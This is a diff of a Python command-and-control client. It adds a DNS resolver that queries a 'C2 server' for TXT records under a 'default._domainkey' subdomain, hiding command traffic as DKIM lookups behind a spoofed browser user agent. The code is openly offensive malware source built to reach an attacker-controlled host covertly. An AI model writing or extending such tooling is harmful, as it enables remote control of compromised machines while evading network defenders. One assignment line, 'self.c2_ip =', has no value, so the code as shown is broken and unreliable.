@@ -1,10 +1,69 @@
 #!/usr/bin/python
 # -*- coding: utf8 -*-
 
-import random
-import string
 import base64
 import time
+import dns
+import dns.resolver
+import dns.zone
+
+
+class DNSResolverError(Exception):
+    def __init__(self, msg):
+        super().__init__(msg)
+
+
+class DNSResolver:
+    """ DNS Resolver OOP implementation
+
+        :param c2_ip: IP address of the C2 server
+    """
+
+    def __init__(self, c2_ip):
+        self.c2_ip =
+        self._resolver = dns.resolver.Resolver()
+        self.__user_agent = 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.10) Gecko/2009042316 ' \
+                            'Firefox/3.0.10 '
+
+    @property
+    def resolver(self):
+        return self._resolver
+
+    def _query_dns_by_type(self, domain: str, r_type: str, timeout: float) -> 'DNS Answer':
+        """ Send a DNS query for a given domain, asking for an specific type of records and returning
+            if timeout exceeds. It also checks the cache to check for already requested queries.
+            :param domain: Domain to query for.
+            :param r_type: Query type.
+            :param timeout: Timeout to wait for the response.
+        """
+
+        domain = domain.lower()
+        r_type = r_type.upper()
+
+        # If non valid request type
+        if r_type not in ['A', 'AAAA', 'ALIAS', 'MX', 'NS', 'SOA', 'SRV', 'TXT', 'PTR', 'CNAME']:
+            raise DNSResolverError('Cannot do a DNS request of "{}": Invalid type'.format(r_type))
+
+        # Set parameters
+        self.resolver.nameservers = [self.c2_ip]
+        self.resolver.timeout = timeout
+        self.resolver.lifetime = timeout
+
+        try:
+            print('[*] Querying DNS {} records from {}'.format(r_type, domain))
+            return self.resolver.query(domain, r_type)
+        except dns.resolver.NXDOMAIN:
+            return None
+
+    def query_DKIM_record(self, domain: str):
+        """ Get the DKIM record information by doing a TXT DNS query to the C" server IP address
+        """
+
+        # Get TXT records by querying default._domainkey subdomain of the C2 domain.
+        txt_records = self._query_dns_by_type('default._domainkey.{}'.format(domain), 'TXT', 2000)
+
+        # Get every record decoded with UTF-8
+        return [j for x in txt_records for j in list(map(lambda k: k.decode('utf-8'), x.strings))]
 
 
 class Client:
@@ -21,6 +80,7 @@ class Client:
     def __init__(self, c2s_ip: str, target_domain: str):
         self.c2s_ip = c2s_ip
         self.target_domain = target_domain
+        self.resolver = DNSResolver(c2s_ip)
         self.function_reference = {
             1: {
                 'name': 'Print',
